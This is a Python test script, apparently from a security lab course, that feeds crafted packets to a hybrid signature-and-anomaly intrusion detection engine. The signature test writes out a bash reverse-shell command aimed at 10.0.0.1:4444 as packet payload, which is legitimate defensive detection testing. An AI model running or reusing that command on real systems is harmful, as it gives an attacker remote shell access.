import sys
from pathlib import Path

ROOT_DIR = Path(__file__).resolve().parent.parent.parent
if str(ROOT_DIR) not in sys.path:
    sys.path.insert(0, str(ROOT_DIR))

from scapy.all import Ether, IP, TCP, UDP, Raw
from labs.week_03.ids_engine import HybridIDSEngine

def run_ids_test():
    print("================================================================================")
    print("       WEEK 3 - DAY 17: HYBRID IDS ENGINE (SIGNATURE + ANOMALY) TEST            ")
    print("================================================================================\n")

    ids = HybridIDSEngine(pps_threshold=10.0)

    # Test 1: Benign Packet (Should produce 0 alerts)
    print("[1/3] Testing Benign HTTP Web Request...")
    benign_pkt = (
        Ether() / IP(src="192.168.1.11", dst="192.168.1.10") /
        TCP(sport=50000, dport=80, flags="PA") /
        Raw(load=b"GET /index.html HTTP/1.1\r\nHost: twin.internal\r\n\r\n")
    )
    result = ids.process_packet(benign_pkt)
    assert result is None, "Benign packet generated a false positive alert!"
    print("    [PASS] Clean packet passed with 0 alerts.")

    # Test 2: Signature Match (Exploit Command Attempt)
    print("\n[2/3] Testing Exploit Signature Injection (/bin/sh)...")
    exploit_pkt = (
        Ether() / IP(src="192.168.1.99", dst="192.168.1.10") /
        TCP(sport=51234, dport=80, flags="PA") /
        Raw(load=b"POST /upload HTTP/1.1\r\n\r\n; /bin/sh -i >& /dev/tcp/10.0.0.1/4444 0>&1")
    )
    sig_result = ids.process_packet(exploit_pkt)
    assert sig_result is not None, "Failed to identify signature exploit payload!"
    print(f"    [PASS] Signature Matched: {sig_result['alerts'][0]['alert']} (Severity: {sig_result['alerts'][0]['severity']})")

    # Test 3: Anomaly Surge Match (> 10 PPS threshold)
    print("\n[3/3] Testing High-Frequency Packet Rate Burst...")
    burst_detected = False
    for i in range(15):
        burst_pkt = (
            Ether() / IP(src="10.0.0.88", dst="192.168.1.10") /
            UDP(sport=40000 + i, dport=53) /
            Raw(load=b"BURST_FLOOD_PROBE")
        )
        burst_result = ids.process_packet(burst_pkt)
        if burst_result and any(a["alert"].startswith("RATE_SURGE") for a in burst_result["alerts"]):
            burst_detected = True
            print(f"    [PASS] Anomaly Engine Triggered at Packet #{i+1}: {burst_result['alerts'][-1]['alert']}")
            break

    assert burst_detected, "Anomaly rate surge was not identified!"

    print("\n================================================================================")
    print("               ALL IDS DETECTION MODALITIES VERIFIED                            ")
    print("================================================================================")

if __name__ == "__main__":
    run_ids_test()